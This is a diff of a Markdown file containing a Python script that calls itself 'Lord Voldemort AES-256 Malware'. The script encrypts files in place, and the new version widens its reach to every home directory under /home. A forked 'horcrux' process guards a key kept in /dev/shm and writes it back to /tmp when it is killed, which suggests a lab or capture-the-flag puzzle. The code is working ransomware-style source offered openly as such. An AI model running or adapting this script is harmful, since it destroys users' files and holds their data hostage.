@@ -84,99 +84,101 @@ if __name__ == "__main__":
 
 ```
 import os
-import random
 import base64
 import base62
+import random
 import signal
+import string
+import subprocess
+import threading
 import time
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad, unpad
 
-USER_DIR = "/home/skywalker-341"
-KEY_PATH = "/dev/shm/.horcrux_key"
-RESTORE_PATH = "/tmp/.horcrux"
-ENC_KEY = b'VolDeMor'  # 64-bit = 8 bytes static encoding key
+# === CONFIG ===
+KEY_FILE = "/tmp/.key.horcrux"
+RAM_KEY_PATH = "/dev/shm/.key.horcrux"
+KEY_LENGTH = 16  # 128 bits
+PROTECTED_EXT = {'.sh', '.conf', '.key', '.horcrux'}
 
-# Encrypt AES-256 key using ENC_KEY (64-bit)
-def encrypt_key(aes_key):
-    cipher = AES.new(pad(ENC_KEY, 16), AES.MODE_ECB)
-    encrypted_key = cipher.encrypt(pad(aes_key, 32))
-    return encrypted_key
+# === KEY GENERATION ===
+def generate_key():
+    return get_random_bytes(KEY_LENGTH)
 
-def decrypt_key(encrypted_key):
-    cipher = AES.new(pad(ENC_KEY, 16), AES.MODE_ECB)
-    return unpad(cipher.decrypt(encrypted_key), 32)
+def save_key_to_ram(key):
+    with open(RAM_KEY_PATH, 'wb') as f:
+        f.write(key)
+    print(f"[+] Key stored in RAM at {RAM_KEY_PATH}")
 
-# AES-256 file encryption
-def encrypt_file(filepath, aes_key):
-    cipher = AES.new(aes_key, AES.MODE_EAX)
-    with open(filepath, 'rb') as f:
-        plaintext = f.read()
-    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
-    with open(filepath, 'wb') as f:
-        f.write(cipher.nonce + tag + ciphertext)
+def restore_key_file():
+    if os.path.exists(RAM_KEY_PATH):
+        with open(RAM_KEY_PATH, 'rb') as src, open("/tmp/.horcrux", 'wb') as dest:
+            dest.write(src.read())
+        print("[+] Key restored to /tmp/.horcrux")
+    else:
+        print("[-] RAM key not found.")
 
-# Encrypt all files in user directory
-def encrypt_directory(base_path, key):
-    for root, dirs, files in os.walk(base_path):
-        for file in files:
-            try:
-                full_path = os.path.join(root, file)
-                encrypt_file(full_path, key)
-            except Exception as e:
-                print(f"[-] Failed to encrypt {full_path}: {e}")
+# === AES ENCRYPTION ===
+def pad(data):
+    return data + b' ' * (AES.block_size - len(data) % AES.block_size)
 
-# "Horcrux" process watcher
-def horcrux_process():
-    def signal_handler(sig, frame):
-        print("[!] Horcrux killed. Restoring encoded key...")
-        with open(KEY_PATH, 'rb') as f:
-            data = f.read()
-        with open(RESTORE_PATH, 'wb') as f:
-            f.write(data)
-        print(f"[+] Key restored at {RESTORE_PATH}")
-        os._exit(0)
+def encrypt_file(file_path, key):
+    if any(file_path.endswith(ext) for ext in PROTECTED_EXT):
+        return
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    cipher = AES.new(key, AES.MODE_CBC)
+    encrypted_data = cipher.iv + cipher.encrypt(pad(data))
+    with open(file_path, 'wb') as f:
+        f.write(encrypted_data)
 
-    signal.signal(signal.SIGTERM, signal_handler)
-    print("[+] Horcrux guarding encoded key. PID:", os.getpid())
+# === HOME DIR TARGETING ===
+def get_user_dirs():
+    base = "/home"
+    return [os.path.join(base, d) for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]
+
+def encrypt_directories(paths, key):
+    for path in paths:
+        print(f"[+] Encrypting {path}")
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                try:
+                    full_path = os.path.join(root, file)
+                    encrypt_file(full_path, key)
+                except Exception as e:
+                    print(f"[-] Failed to encrypt {full_path}: {e}")
+
+# === HORCRUX PROCESS ===
+def horcrux_guard():
+    def handle_signal(signum, frame):
+        print("[*] horcrux killed, restoring key...")
+        restore_key_file()
+        exit(0)
+
+    signal.signal(signal.SIGTERM, handle_signal)
+    signal.signal(signal.SIGINT, handle_signal)
+    print("[+] horcrux process running... (kill me to restore key)")
     while True:
         time.sleep(1)
 
-# Launch Horcrux process
-def spawn_horcrux_guard(encoded_key):
-    with open(KEY_PATH, 'wb') as f:
-        f.write(encoded_key)
-
+def spawn_horcrux():
     pid = os.fork()
     if pid == 0:
-        os.setsid()
-        os.execlp("python3", "python3", __file__, "--horcrux")
+        horcrux_guard()
     else:
-        print(f"[+] Horcrux process spawned with PID {pid}")
+        return pid
 
-# Entry
+# === MAIN ===
+def main():
+    print("[*] Voldemort v2: AES-256 File Encryption in Action...")
+    user_dirs = get_user_dirs()
+    key = generate_key()
+    save_key_to_ram(key)
+    horcrux_pid = spawn_horcrux()
+    encrypt_directories(user_dirs, key)
+    print(f"[+] Encryption complete. horcrux PID: {horcrux_pid}")
+
 if __name__ == "__main__":
-    import sys
-    if len(sys.argv) > 1 and sys.argv[1] == "--horcrux":
-        horcrux_process()
-        sys.exit(0)
-
-    print("[*] Starting Lord Voldemort AES-256 Malware")
-
-    # Generate 256-bit AES key
-    aes_key = get_random_bytes(32)
-    encoded_key = encrypt_key(aes_key)
-
-    # Encrypt files in target directory
-    encrypt_directory(USER_DIR, aes_key)
-
-    # Store encoded AES key in RAM + protect with horcrux
-    spawn_horcrux_guard(encoded_key)
-
-    print("[+] Encryption done. Horcrux holds the key... in the void 🧠")
-
-
-
+    main()
 
 ```
